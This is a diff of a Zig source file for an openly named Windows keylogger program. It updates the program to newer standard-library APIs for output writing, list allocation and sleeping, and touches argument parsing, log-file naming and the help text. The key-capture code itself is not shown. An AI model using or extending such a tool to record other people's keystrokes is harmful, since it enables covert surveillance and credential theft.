@@ -1,9 +1,11 @@
 const VERSION = "2.0.0";
 const std = @import("std");
+const File = std.fs.File;
+const Writer = std.Io.Writer;
 const Allocator = std.mem.Allocator;
 const ArenaAllocator = std.heap.ArenaAllocator;
 const ArrayList = std.ArrayList;
-const sleep = std.time.sleep;
+const sleep = std.Thread.sleep;
 const eql = std.mem.eql;
 const argsAlloc = std.process.argsAlloc;
 const argsWithAllocator = std.process.argsWithAllocator;
@@ -27,6 +29,10 @@ pub fn main() !void {
     defer arena.deinit();
     const allocator = arena.allocator();
 
+    var stdout_buffer: [1024]u8 = undefined;
+    var stdout_writer = File.stdout().writer(&stdout_buffer);
+    const stdout = &stdout_writer.interface;
+
     const args = try argsAlloc(allocator);
     defer argsFree(allocator, args);
 
@@ -34,16 +40,16 @@ pub fn main() !void {
     defer args_iter.deinit();
     _ = args_iter.next();
 
-    var arg_output_path = ArrayList(u8).init(allocator);
-    defer arg_output_path.deinit();
+    var arg_output_path = try ArrayList(u8).initCapacity(allocator, 1024);
+    defer arg_output_path.deinit(allocator);
 
     var arg_verbose: u8 = 0;
     var arg_use_date = false;
     var arg_sleep: usize = 0;
     while (args_iter.next()) |arg| {
         if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
-            try printHeader();
-            try printHelp();
+            try printHeader(stdout);
+            try printHelp(stdout);
             return;
         } else if (eql(u8, arg, "-v") or eql(u8, arg, "--verbose")) {
             arg_verbose = 1;
@@ -52,7 +58,7 @@ pub fn main() !void {
         } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
             if (args_iter.next()) |next_arg| {
                 arg_output_path.clearRetainingCapacity();
-                try arg_output_path.appendSlice(next_arg);
+                try arg_output_path.appendSlice(allocator, next_arg);
             }
         } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
             arg_use_date = true;
@@ -71,9 +77,9 @@ pub fn main() !void {
             var output_path_b: [1024]u8 = undefined;
             const output_path_l = cTime.strftime(&output_path_b, 255, "keylogger_%Y%m%d_%H%M%S.log", localtime);
             const output_path_s: []u8 = output_path_b[0..output_path_l];
-            try arg_output_path.appendSlice(output_path_s);
+            try arg_output_path.appendSlice(allocator, output_path_s);
         } else {
-            try arg_output_path.appendSlice("keylogger.log");
+            try arg_output_path.appendSlice(allocator, "keylogger.log");
         }
     }
     if (arg_sleep <= 3) {
@@ -81,14 +87,14 @@ pub fn main() !void {
     }
     arg_sleep *= std.time.ns_per_ms;
 
-    const stdout = std.io.getStdOut().writer();
     const file_exists = fileExists(allocator, arg_output_path.items);
 
     if (arg_verbose >= 1) {
-        try printHeader();
+        try printHeader(stdout);
         try stdout.print("output file exists: {any}\n", .{file_exists});
         try stdout.print("output file path: {s}\n", .{arg_output_path.items});
         try stdout.print("sleep: {d}\n", .{arg_sleep});
+        try stdout.flush();
     }
 
     const dir = std.fs.cwd();
@@ -154,13 +160,13 @@ pub fn main() !void {
     }
 }
 
-fn printHeader() !void {
-    const stdout = std.io.getStdOut().writer();
+fn printHeader(stdout: *Writer) !void {
     try stdout.print("Keylogger " ++ VERSION ++ "\n", .{});
     try stdout.print("Copyright (C) 2009, 2025 Christian Mayer <https://fox21.at>\n\n", .{});
+    try stdout.flush();
 }
 
-fn printHelp() !void {
+fn printHelp(stdout: *Writer) !void {
     const help =
         \\Usage: keylogger.exe [<options>]
         \\
@@ -171,9 +177,8 @@ fn printHelp() !void {
         \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
         \\-s, --sleep <msec>        Time to sleep in milliseconds. Default: 10
     ;
-
-    const stdout = std.io.getStdOut().writer();
-    try stdout.print(help, .{});
+    try stdout.print(help ++ "\n", .{});
+    try stdout.flush();
 }
 
 fn fileExists(allocator: Allocator, path: []const u8) bool {
